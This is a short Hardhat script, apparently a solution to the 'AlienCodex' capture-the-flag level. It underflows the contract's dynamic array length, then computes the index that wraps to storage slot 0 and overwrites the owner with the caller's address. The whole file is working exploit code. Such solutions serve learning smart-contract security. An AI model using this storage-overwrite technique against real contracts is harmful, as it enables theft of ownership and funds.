const {ethers} = require("hardhat");
const {getContractAddress} = require("@ethersproject/address");
const {BigNumber} = require("ethers");
require('dotenv').config()

async function main() {
  const AlienCodex = await ethers.getContractFactory("AlienCodex");
  // const alienCodex = await AlienCodex.deploy();
  // await alienCodex.deployed();
  const alienCodex = AlienCodex.attach(process.env.ALIEN_CODEX_ADDR);

  const [user] = await ethers.getSigners();
  console.log(`user: ${user.address}`);
  const owner = await alienCodex.owner();
  console.log(`owner: ${owner}`);

  let tx = await alienCodex.make_contact();
  await tx.wait();
  const slot0 = await ethers.provider.getStorageAt(alienCodex.address, 0);
  console.log(`slot0: ${slot0}`);
  tx = await alienCodex.retract();
  await tx.wait();
  const arrayStartSlot = ethers.utils.solidityKeccak256(['uint'], [1]);
  const maxBytes32 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
  const ownerIndex = BigNumber.from(maxBytes32).sub(BigNumber.from(arrayStartSlot)).add(1);
  tx = await alienCodex.revise(ownerIndex, '0x000000000000000000000000' + user.address.slice(2));
  await tx.wait();
  console.log(`owner: ${await alienCodex.owner()}`);

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
